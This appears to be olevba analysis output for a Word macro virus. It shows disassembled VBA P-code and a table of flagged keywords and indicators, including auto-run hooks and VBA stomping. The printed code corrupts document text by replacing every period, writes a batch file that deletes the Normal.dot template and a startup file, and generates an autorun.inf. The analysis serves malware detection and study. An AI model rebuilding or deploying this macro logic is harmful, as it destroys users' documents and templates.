' 	ArgsMemCall ClearFormatting 0x0000 
' Line #181:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #182:
' 	LitStr 0x0001 "."
' 	MemStWith Then 
' Line #183:
' 	LitStr 0x000B " Edds Head "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #184:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #185:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #186:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #187:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #188:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #189:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #190:
' 	EndWith 
' Line #191:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #192:
' 	EndSub 
' Line #193:
' Line #194:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #195:
' Line #196:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #197:
' 	OnError (Resume Next) 
' Line #198:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #199:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #200:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #201:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #202:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #203:
' 	Ld Friend 
' 	St hFile 
' Line #204:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	Add 
' 	PrintItemNL 
' Line #212:
' 	Ld hFile 
' 	Close 0x0001 
' Line #213:
' 	EndSub 
' Line #214:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #215:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #216:
' 	OnError (Resume Next) 
' Line #217:
' 	ArgsCall Read 0x0000 
' Line #218:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #219:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #220:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #221:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #222:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #223:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #224:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #225:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #226:
' 	Ld Friend 
' 	St hFile 
' Line #227:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #229:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #231:
' 	ElseBlock 
' Line #232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	Ld hFile 
' 	Close 0x0001 
' Line #235:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

